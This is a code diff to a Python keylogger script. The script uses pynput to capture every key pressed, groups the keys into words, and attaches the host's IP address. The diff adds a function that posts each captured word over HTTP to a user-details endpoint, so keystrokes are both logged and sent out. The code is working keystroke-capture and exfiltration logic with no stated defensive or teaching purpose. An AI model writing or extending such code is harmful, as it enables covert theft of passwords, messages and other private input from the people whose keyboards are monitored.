@@ -1,5 +1,6 @@
 from pynput.keyboard import Key, Listener
 import socket
+from requests import post
 
 currentString = ''
 
@@ -22,7 +23,7 @@ def get_ip_address():
 
 
 def prepare_body(ip_address, message):
-    return {'ip_address': ip_address, 'message': message}
+    return {'ipAddress': ip_address, 'message': message}
 
 
 def clear_string():
@@ -30,15 +31,27 @@ def clear_string():
     currentString = ''
 
 
+def post_message(message):
+    host = 'localhost'
+    port = '8080'
+    endpoint = 'user-details'
+    post(url="http://{}:{}/{}".format(host, port, endpoint), data=message)
+
+
+def send_message(message):
+    body = prepare_body(get_ip_address(), message)
+    add_to_topic('keyboardInput1', body)
+    post_message(body)
+
+
 def add_to_topic(topic, message):
-    topic_message = prepare_body(get_ip_address(), message)
-    print('Sent {} to topic {}'.format(topic_message, topic))
+    print('Sent {} to topic {}'.format(message, topic))
 
 
 def on_press(key):
     global currentString
     if is_whitespace(key):
-        add_to_topic('keyboard_input', currentString)
+        send_message(currentString)
         clear_string()
     elif key is Key.backspace:
         delete_last_character()
